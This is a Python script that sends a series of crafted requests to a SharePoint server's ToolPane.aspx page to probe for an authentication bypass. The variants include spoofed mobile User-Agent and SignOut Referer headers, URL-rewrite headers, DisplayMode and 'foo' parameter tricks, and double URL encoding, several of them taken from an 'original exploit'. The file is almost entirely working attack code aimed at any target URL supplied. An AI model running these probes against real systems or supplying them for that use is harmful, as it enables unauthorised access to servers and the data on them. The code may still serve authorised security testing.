#!/usr/bin/env python3
"""
Test parameter and header-based authentication bypasses
Focus on combinations from original exploit that might bypass auth
"""

import requests
import argparse

def test_bypass(target_url, endpoint, params="", headers={}, method="POST", data="", description=""):
    """Test a specific bypass combination"""
    print(f"\n[*] Test: {description}")

    url = f"{target_url}{endpoint}"
    if params:
        url = f"{url}?{params}"

    try:
        if method == "POST":
            response = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
        else:
            response = requests.get(url, headers=headers, allow_redirects=False, timeout=10)

        print(f"    Status: {response.status_code}")

        if response.status_code == 200:
            print(f"    [+] POSSIBLE BYPASS! 200 OK")
            print(f"    Body (first 200 chars): {response.text[:200]}")
            return True
        elif response.status_code == 401:
            print(f"    [-] 401 - Auth required")
        elif response.status_code == 500:
            print(f"    [~] 500 - Server error (might indicate param processed)")
            print(f"    Body (first 200 chars): {response.text[:200]}")
        else:
            print(f"    [?] {response.status_code}")

        return False
    except Exception as e:
        print(f"    [!] Error: {str(e)[:100]}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Test param/header auth bypass")
    parser.add_argument("--url", required=True, help="Target SharePoint URL")
    args = parser.parse_args()

    target_url = args.url.rstrip('/')

    # Base headers from original exploit
    mobile_ua = "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"
    desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    print("[*] Testing Parameter and Header-Based Authentication Bypasses")
    print("=" * 70)

    # Test 1: Mobile UA + ToolPane.aspx
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit&foo=/ToolPane.aspx",
               headers={"User-Agent": mobile_ua},
               description="Mobile UA + ToolPane params")

    # Test 2: Mobile UA + Referer SignOut.aspx
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit&foo=/ToolPane.aspx",
               headers={"User-Agent": mobile_ua, "Referer": "/_layouts/SignOut.aspx"},
               description="Mobile UA + SignOut Referer")

    # Test 3: X-FORMS_BASED_AUTH_ACCEPTED header (from historical research)
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit&foo=/ToolPane.aspx",
               headers={"X-FORMS_BASED_AUTH_ACCEPTED": "f"},
               description="X-FORMS_BASED_AUTH_ACCEPTED header")

    # Test 4: X-REWRITE-URL header (from historical research)
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               headers={"X-REWRITE-URL": "/ToolPane.aspx?DisplayMode=Edit"},
               description="X-REWRITE-URL header")

    # Test 5: X-ORIGINAL-URL header
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               headers={"X-ORIGINAL-URL": "/ToolPane.aspx?DisplayMode=Edit"},
               description="X-ORIGINAL-URL header")

    # Test 6: MSOWebPartPage_Shared header
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit",
               headers={"MSOWebPartPage_Shared": "true"},
               description="MSOWebPartPage_Shared header")

    # Test 7: SOAPAction header
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit",
               headers={"SOAPAction": "http://schemas.microsoft.com/sharepoint/"},
               description="SOAPAction header")

    # Test 8: DisplayMode with different values
    for mode in ["Edit", "Design", "Preview", "Browse"]:
        test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
                   params=f"DisplayMode={mode}",
                   description=f"DisplayMode={mode}")

    # Test 9: IsDlg parameter (dialog mode)
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="IsDlg=1&DisplayMode=Edit",
               description="IsDlg=1 (dialog mode)")

    # Test 10: Source parameter with SignOut.aspx
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="Source=/_layouts/SignOut.aspx&DisplayMode=Edit",
               description="Source=SignOut.aspx")

    # Test 11: Combination of headers from original exploit
    headers_combo = {
        "User-Agent": mobile_ua,
        "Referer": "/_layouts/SignOut.aspx",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit&foo=/ToolPane.aspx",
               headers=headers_combo,
               method="POST",
               data="test=1",
               description="Full header combo from original exploit")

    # Test 12: ToolPaneView parameter
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="ToolPaneView=2&DisplayMode=Edit",
               description="ToolPaneView parameter")

    # Test 13: PageView parameter
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="PageView=Shared&DisplayMode=Edit",
               description="PageView=Shared")

    # Test 14: Test with double URL encoding in foo parameter
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx",
               params="DisplayMode=Edit&foo=%252FToolPane.aspx",
               description="Double URL-encoded foo parameter")

    print("\n[*] All parameter/header bypass tests completed")

if __name__ == "__main__":
    main()
